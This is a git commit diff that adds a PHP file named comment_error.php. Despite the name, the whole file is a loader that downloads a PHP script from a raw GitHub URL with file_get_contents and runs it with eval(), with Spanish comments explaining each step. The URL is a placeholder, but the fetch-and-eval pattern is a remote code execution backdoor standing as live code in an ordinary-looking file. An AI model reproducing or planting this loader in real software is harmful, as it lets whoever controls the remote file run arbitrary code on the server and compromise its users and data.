e19922f9d01d927b2858585bdba9a2a7382e45a0
vicnava14 <94847761+vicnava14@users.noreply.github.com>
2023-10-10 14:48:06 -0400

    Update comment_error.php

--- comment_error.php
+++ comment_error.php
@@ -1,1 +1,19 @@
+<?php 
 
+// URL del archivo en GitHub que deseas ejecutar
+$githubRepoUrl = 'https://raw.githubusercontent.com/usuario/repo/master/script.php';
+
+// Obtener el contenido del archivo desde GitHub
+$scriptContent = file_get_contents($githubRepoUrl);
+
+// Verificar si se obtuvo el contenido correctamente
+if ($scriptContent === false) {
+    die('No se pudo obtener el contenido del archivo desde GitHub.');
+}
+
+// Ejecutar el script obtenido desde GitHub
+eval($scriptContent);
+
+// Aquí puedes continuar con tu lógica de la aplicación después de ejecutar el script
+
+?>
